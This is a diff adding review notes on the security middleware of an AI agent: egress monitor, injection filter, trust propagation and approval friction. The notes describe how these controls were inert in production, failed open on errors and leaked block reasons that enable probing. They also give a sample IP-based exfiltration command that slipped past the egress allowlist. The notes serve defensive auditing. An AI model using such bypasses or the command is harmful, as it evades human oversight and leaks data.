@@ -68,3 +68,24 @@
 - Tool contracts had the right structure but wrong severity assignments — warnings on critical paths defeat the purpose
 - Approval velocity is a good concept but the window math doesn't account for interleaved denials or timing attacks
 - Circuit breaker event types had a type mismatch (open vs opened) that would silently break event filtering
+
+## PR-03: [SEC] Security Middleware — trust-propagation, sequence-detector, egress-monitor, contract-enforcement, injection-filter, approval-friction
+
+### Architecture Insights
+
+- These 6 files are the middleware hooks that enforce security decisions from PR-01 and PR-02
+- They run in the middleware pipeline which has `wrapToolCall` (pre-execution) and `afterToolResult` (post-execution) hooks
+- **CRITICAL DISCOVERY: The middleware pipeline was never wired into the agent loop's tool execution path.** `runWrapToolCall` and `runAfterToolResult` were only called in tests. All 8 security middleware layers were completely inert in production.
+
+### Security Observations
+
+- **CRITICAL: All middleware was test-only.** The agent loop only called `runBeforeAgent`. Tool call interception (`wrapToolCall`) and result processing (`afterToolResult`) were never called during actual agent operation. Fixed by wrapping AI SDK tool execute functions with middleware calls.
+- **Egress monitor IP bypass:** `extractDomains` regex only matched domain-based URLs, not IP addresses. `curl http://203.0.113.10/collect` bypassed the allowlist entirely.
+- **Pipeline had no error handling:** A throw in any middleware would skip all subsequent middleware (fail-open). Fixed with try-catch that blocks on error (fail-closed for wrapToolCall, continue for afterToolResult).
+- **Block reasons leak internal state:** Trust scores, rule names, and command snippets returned to the model, enabling adversarial probing.
+
+### Key Takeaways
+
+- The most important finding of the entire review: production code never called the security middleware. Tests showed "blocked" but the agent would have executed every blocked tool call in real usage.
+- The fix wraps every AI SDK tool's `execute` function with middleware pipeline calls at the point where tools are built (loop.ts lines 434-444)
+- Egress monitor needed IPv4 extraction alongside domain extraction
